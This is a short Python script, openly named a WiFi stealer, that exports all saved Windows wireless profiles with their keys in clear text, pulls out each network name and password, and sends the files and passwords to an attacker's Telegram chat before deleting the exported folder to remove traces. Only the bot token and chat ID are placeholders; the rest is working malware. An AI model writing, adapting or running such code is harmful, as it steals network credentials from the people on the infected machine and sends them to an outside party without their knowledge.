import subprocess
import os
import xml.etree.ElementTree as ET
import telebot

# Configuration
TOKEN = "YOUR_TELEGRAM_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

bot = telebot.TeleBot(TOKEN)
bot.send_message(CHAT_ID, "Starting WiFi stealing process...")

class WifiSteal:
    @staticmethod
    def steal(folderPath):
        if not os.path.exists(folderPath):
            os.makedirs(folderPath)

        cmd = f"netsh wlan export profile key=clear folder=\"{folderPath}\""
        subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        fileNames = os.listdir(folderPath)

        for fileName in fileNames:
            filePath = os.path.join(folderPath, fileName)
            name, keyMaterial = WifiSteal.get_name_and_key_material_from_file(filePath)
            
            if name and keyMaterial:
                with open(filePath, "rb") as file:
                    bot.send_document(CHAT_ID, file)
                
                message = f"ℹ️ WiFi Name: {name}, WiFi Password: {keyMaterial}"
                bot.send_message(CHAT_ID, message)

        # Remove the WiFi folder
        os.system(f"rmdir /S /Q \"{folderPath}\"")

    @staticmethod
    def get_name_and_key_material_from_file(filePath):
        name = ""
        keyMaterial = ""

        try:
            tree = ET.parse(filePath)
            root = tree.getroot()

            ns = {"ns": "http://www.microsoft.com/networking/WLAN/profile/v1"}
            nameNode = root.find("./ns:SSIDConfig/ns:SSID/ns:name", ns)
            keyMaterialNode = root.find("./ns:MSM/ns:security/ns:sharedKey/ns:keyMaterial", ns)

            if nameNode is not None:
                name = nameNode.text

            if keyMaterialNode is not None:
                keyMaterial = keyMaterialNode.text

        except Exception as ex:
            bot.send_message(CHAT_ID, f"❌ Error while retrieving name and keyMaterial: {ex}")

        return name, keyMaterial

# Start the WiFi stealing process
folderPath = "WiFi"
WifiSteal.steal(folderPath)
